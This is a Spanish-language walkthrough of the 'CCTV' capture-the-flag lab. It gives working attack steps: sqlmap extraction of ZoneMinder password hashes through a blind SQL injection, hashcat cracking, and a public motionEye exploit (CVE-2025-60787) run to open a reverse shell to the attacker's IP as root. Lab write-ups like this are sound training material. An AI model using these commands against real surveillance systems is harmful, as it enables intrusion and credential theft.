
# CCTV

<figure><img src="/files/rJRX5hn2JrOJnDClWwLW" alt=""><figcaption></figcaption></figure>

## <mark style="color:$primary;">Información General</mark>

* **Nombre de la máquina:** `CCTV`
* **IP:** `10.129.51.120`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟢 Fácil`
* **Fecha:** `30/04/2026`

***

## <mark style="color:$primary;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.129.51.120 cctv.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

#### Escaneo Simple

```bash
sudo nmap -v -sV -T5 10.129.51.120
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo encontramos puertos comunes (22 y 80) abiertos. Nos centraremos en el servicio web.

### Acceso Web

Accedemos a `http://cctv.htb` y observamos que parece ser una plataforma de CCTV para gestionar distintas cámas online:

<figure><img src="/files/v2qdE7OBZqaJq6AIqzay" alt=""><figcaption></figcaption></figure>

La única funcionalidad relevante es el login, ya que el Get a Quote solo te abre el email para ponerse en contacto con ellos.

### ZoneMinder

Observamos que el login es un `ZoneMinder`:

<figure><img src="/files/XFrrM2yBDC2VInnIRUvV" alt=""><figcaption></figcaption></figure>

Probamos credenciales por defecto `admin:admin` y conseguimos acceder!

<figure><img src="/files/6mBxNPzhv4UJja3VvNtp" alt=""><figcaption></figcaption></figure>

## <mark style="color:$primary;">Enumeración web</mark>

### Versión

Si accedemos a `Options > Versions` obtenemos la versión actual `1.37.63` que vemos que no está actualizada a la última versión `1.38.1`, por lo que seguramente habrá algún exploit público para explotarlo:

<figure><img src="/files/Up7SRFsYo77mhaqQF6JH" alt=""><figcaption></figcaption></figure>

### Usuarios

En la pestaña `Users` encontramos 3 usuarios (incluído admin):

<figure><img src="/files/fJOZkoRSfY2GeYL1w6Al" alt=""><figcaption></figcaption></figure>

Destacan mark y superadmin, con los que posiblemente podríamos acceder por SSH.

***

## <mark style="color:$primary;">Explotación</mark>

### SQL Injection

Buscando exploits para `ZoneMinder 1.37.63` encontramos el siguiente PoC para explotar un SQL Injection:

{% embed url="<https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3>" %}

#### 1. Burp Suite

Accedemos a la siguiente URL y capturamos la petición con BurpSuite:

```
http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1
```

<figure><img src="/files/baE9ONKqtT4gTfglrFtn" alt=""><figcaption></figcaption></figure>

En la petición modificamos el parámetro removetag\&tid=1 y cambiamos el 1 por un asterisco (\*) para que SQLMap sepa dónde inyectar:

<pre><code><strong>removetag&#x26;tid=*
</strong></code></pre>

Seleccionamos todo el texto > `Save selected text to file` > `burp.req`

#### 2. SQL Map

```bash
sqlmap -r burp.req --batch --dbs --level 3                                               
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.10.2#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:46:44 /2026-04-30/

[02:46:44] [INFO] parsing HTTP request from 'burp.req'
[02:46:44] [INFO] testing connection to the target URL
[02:46:44] [INFO] checking if the target is protected by some kind of WAF/IPS
[02:46:44] [INFO] testing if the target URL content is stable
[02:46:45] [INFO] target URL content is stable
[02:46:45] [INFO] testing if GET parameter 'view' is dynamic

<----SNIP---->

02:51:33] [INFO] checking if the injection point on GET parameter 'tid' is a false positive
GET parameter 'tid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 4738 HTTP(s) requests:
---
Parameter: tid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 9629 FROM (SELECT(SLEEP(5)))EAgv)
---
[02:52:14] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12
[02:52:15] [INFO] fetching database names
[02:52:15] [INFO] fetching number of databases
[02:52:31] [INFO] retrieved: information_schema
[02:53:36] [INFO] retrieved: performance_schema
[02:54:40] [INFO] retrieved: zm
available databases [3]:
[*] information_schema
[*] performance_schema
[*] zm
```

Nos ha enumerado las 3 bases de datos! Nos interesa sobre todo la base de datos `zm`, por lo que la vamos a dumpear.

#### Cookie Error

Si la web falla por tema de cookies debemos obtener una nueva cookie y modificar el `burp.req`:

```bash
curl -c cookies.txt -d "username=admin&password=admin" http://cctv.htb/zm/index.php
cat cookies.txt                                                                    
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: cookies.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Netscape HTTP Cookie File
   2   │ # https://curl.se/docs/http-cookies.html
   3   │ # This file was generated by libcurl! Edit at your own risk.
   4   │ 
   5   │ #HttpOnly_cctv.htb  FALSE   /   FALSE   1777493055  ZMSESSID    ld6jiin5ri7jimuto29bp9antg
   6   │ cctv.htb    FALSE   /   FALSE   1812049440  zmCSS   base
   7   │ cctv.htb    FALSE   /   FALSE   1812049440  zmSkin  classic
```

### Ver tablas de la base de datos ZM

{% hint style="warning" %}
En un SQL Injection `Time Based`, por lo que va descubriendo los elementos poco a poco y los va mostrando por pantalla.
{% endhint %}

{% hint style="info" %}
Le podemos especificar la cookie con la flag `--cookie="cookie"` o modificarla en el `burp.req`
{% endhint %}

```bash
qlmap -r burp.req -p tid --cookie="ld6jiin5ri7jimuto29bp9antg" --batch --dbms=mysql -D zm --tables --level=3 --risk=2 
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.10.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:06:58 /2026-04-30/

<----SNIP---->

Database: zm
[43 tables]
+----------------------+
| Config               |
| ControlPresets       |
| Controls             |
| Devices              |
| Event_Data           |
| Event_Summaries      |
| Events_Archived      |
| Events_Day           |
| Events_Hour          |
| Events_Month         |
| Events_Tags          |
| Events_Week          |
| Filters              |
| Frames               |
| Groups_Monitors      |
| Groups_Permissions   |
| Manufacturers        |
| Maps                 |
| Models               |
| MonitorPresets       |
| Monitor_Status       |
| Monitors             |
| Monitors_Permissions |
| MontageLayouts       |
| Object_Types         |
| Reports              |
| Server_Stats         |
| Servers              |
| Sessions             |
| Snapshots            |
| Snapshots_Events     |
| States               |
| Stats                |
| Tags                 |
| TriggersX10          |
| User_Preferences     |
| Users                | # Tabla que nos interesa
| ZonePresets          |
| Zones                |
| Events               |
| Groups               |
| Logs                 |
| Storage              |
+----------------------+
```

### Dumpear tabla Users

{% hint style="info" %}
Para que el proceso sea más rápido dumpearemos solo el Username y el Password con la flag

&#x20;`-sql-query="SELECT Username,Password FROM Users"`
{% endhint %}

```bash
sqlmap -r burp.req -p tid --cookie="ld6jiin5ri7jimuto29bp9antg" --batch -D zm -T Users -sql-query="SELECT Username,Password FROM Users"
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.10.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:28:35 /2026-04-30/

<----SNIP---->

SELECT Username,Password FROM Users [3]:
[*] admin,$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
[*] mark,$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
[*] superadmin,$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m
```

Tenemos los 3 hashes de los 3 usuarios!

### Cracking de hashes

Los hashes de ZoneMinder son **bcrypt** (modo 3200 de hashcat):

```bash
hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Conseguimos crackear el hash de `mark`:

```
$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame
                                                          
Session..........: hashcat
Status...........: Cracked
```

Y el de superadmin (pero no sirve para acceder por SSH):

```
$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m:admin
                                                          
Session..........: hashcat
Status...........: Cracked
```

***

## <mark style="color:$primary;">Acceso Inicial</mark>

Accedemos por SSH con la contraseña de `mark`:

```bash
ssh mark@cctv.htb
mark@cctv.htb's password:

Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

Last login: Wed Apr 29 19:57:31 2026 from 10.10.15.25
mark@cctv:~$ whoami
mark
```

En la home vemos que superadmin también es mark (por su username):

```bash
mark@cctv:~$ cd /home
mark@cctv:/home$ ls
mark  sa_mark
```

A primera vista, el directorio parecía vacío, así que enumeré todos los archivos, incluidos los ocultos:

```bash
mark@cctv:~$ ls -la
total 36
drwxr-x--- 5 mark mark 4096 Mar  2 09:49 .
drwxr-xr-x 4 root root 4096 Mar  2 09:49 ..
lrwxrwxrwx 1 root root    9 Feb 13 10:01 .bash_history -> /dev/null
-rw-r--r-- 1 mark mark  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 mark mark 3771 Mar 31  2024 .bashrc
drwx------ 2 mark mark 4096 Mar  2 09:49 .cache
drwx------ 3 mark mark 4096 Apr 30 20:13 .gnupg
-rw-r--r-- 1 mark mark  807 Mar 31  2024 .profile
drwx------ 2 mark mark 4096 Mar  2 09:49 .ssh
-rw-rw-r-- 1 mark mark  165 Sep 14  2025 .wget-hsts
```

Una observación notable fue que el archivo `.bash_history` estaba vinculado simbólicamente a `/dev/null`, lo que indica que **el registro del historial de comandos se había deshabilitado intencionalmente** para esta cuenta. Esto a veces se hace para evitar el seguimiento de la actividad en el sistema.

## <mark style="color:$primary;">Escalada de Privilegios</mark>

### Análisis del servicio motionEye

Tras obtener acceso a la consola como **usuario mark** , comencé a realizar una enumeración local para identificar los servicios en ejecución y los posibles vectores de escalada de privilegios. Dado que la máquina parecía estar relacionada con una **infraestructura de videovigilancia** , me centré en los archivos de configuración y los servicios que podrían ser responsables de la monitorización de vídeo.

Durante este proceso, descubrí un **servicio de systemd** relacionado con **motionEye** , un sistema de gestión de vigilancia basado en la web.

```bash
mark@cctv:~$ cat /etc/systemd/system/motioneye.service

[Unit]
Description=motionEye Server
After=network.target local-fs.target remote-fs.target

[Service]
User=root
RuntimeDirectory=motioneye
LogsDirectory=motioneye
StateDirectory=motioneye
ExecStart=/usr/local/bin/meyectl startserver -c /etc/motioneye/motioneye.conf
Restart=on-abort

[Install]
WantedBy=multi-user.target
```

La configuración del servicio reveló que el **servidor motionEye se ejecuta como usuario root** , lo que inmediatamente llamó mi atención.

Ejecutar un servicio como **root** aumenta significativamente la superficie de ataque, ya que cualquier vulnerabilidad en la aplicación o su configuración podría conducir a una **escalada de privilegios a root** . El servicio también inicia el servidor motionEye utilizando el archivo de configuración ubicado en `/etc/motioneye/motioneye.conf`, lo que lo convierte en un objetivo lógico para la inspección.

### Inspeccionando la configuración de motionEye

Para obtener información adicional, abrí el archivo de configuración de motionEye.

```bash
mark@cctv:~$ cat /etc/motioneye/motion.conf

# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162********
# @lang en
# @enabled on
# @normal_password 

setup_mode off
webcontrol_port 7999
webcontrol_interface 1
webcontrol_localhost on
webcontrol_parms 2

camera camera-1.conf
```

Dentro del archivo de configuración, descubrí parámetros de configuración comentados que incluían un **nombre de usuario de administrador y un hash de contraseña** .

```bash
# @admin_username admin
# @admin_password 989c5a8ee87a0e9521ec81a79187d162********
```

El valor asociado `admin_password` parecía ser un **hash SHA-1** , que probablemente corresponde a la contraseña administrativa utilizada por la interfaz motionEye. La configuración también indicaba que la **interfaz de control web se ejecuta en el puerto 7999** , aunque está restringida a la interfaz local:

```
webcontrol_port 7999
webcontrol_localhost on
```

Esto sugiere que la interfaz de administración de motionEye **no está expuesta directamente al exterior** y solo se puede acceder a ella desde el sistema local. Sin embargo, dado que ya tenía acceso a la consola como usuario `mark`, interactuar con este servicio localmente seguía siendo una opción viable.

### Investigación de registros de aplicaciones

Mientras seguía explorando el sistema de archivos, descubrí un archivo de registro relacionado con el sistema de gestión de vídeo.

```bash
mark@cctv:~$ cat /opt/video/backups/server.log

Authorization as sa_mark successful. Command issued: status. Outcome: success. 2026-04-30 20:20:59
Authorization as sa_mark successful. Command issued: disk-info. Outcome: success. 2026-04-30 20:21:39
Authorization as sa_mark successful. Command issued: status. Outcome: success. 2026-04-30 20:22:19
Authorization as sa_mark successful. Command issued: status. Outcome: success. 2026-04-30 20:23:07
Authorization as sa_mark successful. Command issued: disk-info. Outcome: success. 2026-04-30 20:23:44
Authorization as sa_mark successful. Command issued: disk-info. Outcome: success. 2026-04-30 20:24:20
Authorization as sa_mark successful. Command issued: status. Outcome: success. 2026-04-30 20:25:01
Authorization as sa_mark successful. Command issued: status. Outcome: success. 2026-04-30 20:25:50
Authorization as sa_mark successful. Command issued: status. Outcome: success. 2026-04-30 20:26:41
```

Los registros mostraron interacciones repetidas con la API realizadas por la cuenta de **`sa_mark`** que descubrimos antes.

Estas entradas indicaban que la **cuenta** **`sa_mark` está interactuando activamente con la API de motionEye** , emitiendo repetidamente comandos como `status` y `disk-info`. Los mensajes de autorización repetidos confirman que la cuenta se utiliza para interactuar con el servicio mediante programación.

### Acceso a la interfaz web de motionEye: Port Forwarding SSH

Durante la enumeración de la **configuración de motionEye** , observé que la interfaz de control web estaba configurada para escuchar únicamente en la **interfaz local** . Esto se confirmó en el archivo de configuración, donde la opción `webcontrol_localhost` estaba habilitada. Como resultado, la interfaz web de motionEye **no era directamente accesible desde la red** , a pesar de estar ejecutándose en el sistema de destino.

Para interactuar con este servicio interno desde mi máquina atacante, utilicé **el Port Forwarding SSH local** . Esta técnica permite que el tráfico enviado a un puerto local en la máquina atacante se reenvíe a través de la conexión SSH y se entregue a un puerto específico en el host remoto.

Establecí una nueva conexión SSH con el objetivo mientras reenviaba el puerto de la interfaz web de motionEye:

```bash
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

En mi máquina atacante, la información se reenviaba de forma transparente a la **interfaz web de motionEye que se ejecutaba en el sistema objetivo** . Esto me permitía interactuar con el servicio, que de otro modo estaría restringido, como si accediera a él localmente en el propio host.

```
localhost:8765
```

<figure><img src="/files/yOKYZEFjEV6f2o4q9Cqq" alt=""><figcaption></figcaption></figure>

Aqui nos logueamos con las credenciales descubiertas en el archivo de configuración:

```bash
# @admin_username admin
# @admin_password 989c5a8ee87a0e9521ec81a79187d162********
```

Nos logueamos correctamente y vemos una cámara en vivo:

<figure><img src="/files/wm8dPzkUkWAZl34d8Inb" alt=""><figcaption></figcaption></figure>

### Explotación de motionEye: (CVE-2025-60787)

Buscando en Google motionEye Authenticated RCE exploit encontramos el siguiente PoC en GitHub para explotarlo:

{% embed url="<https://github.com/gunzf0x/CVE-2025-60787>" %}

Abrimos una shell por el puerto 4444 (en mi caso usaré penelope)

```bash
penelope
```

Y ejecutamos el exploit:

```bash
python3 CVE-2025-60787.py revshell --url 'http://127.0.0.1:8765' --user 'admin' --password '989c5a8ee87a0e9521ec81a79187d162********' -i 10.10.15.25 --port 4444

[*] Attempting to connect to 'http://127.0.0.1:8765' with credentials 'admin:989c5a8ee87a0e9521ec81a79187d162109282f0'
[*] Valid credentials provided
[*] Obtaining cameras available
[*] Found 1 camera(s)
    1) Name: 'CAM 01' ; ID: 1; root_directory: '/var/lib/motioneye/Camera1'
[*] Using camera by default (first one found) for the exploit
[*] Payload successfully injected. Check your shell...
~Happy Hacking
```

<figure><img src="/files/9Ta9r1Ti1SdASutjfd2K" alt=""><figcaption></figcaption></figure>

Tenemos una shell como root directamente!

***

## <mark style="color:$primary;">User Flag</mark>

La user flag está en la home de `sa_mark`:

```bash
root@cctv:# cd /home/sa_mark/

root@cctv:/home/sa_mark# ls
'SecureVision Staff Announcement.pdf'   user.txt

root@cctv:/home/sa_mark# cat user.txt 
ca2dc36c585f5c67b83d8fca********
```

***

## <mark style="color:$primary;">👑</mark> <mark style="color:$primary;">Root Flag</mark>

```bash
root@cctv:/home/sa_mark# cd /root

root@cctv:~# ls
clean_logs.sh  docker-binaries  files  root.txt  snap

root@cctv:~# cat root.txt 
9020102a89c165980a33a9ce********
```
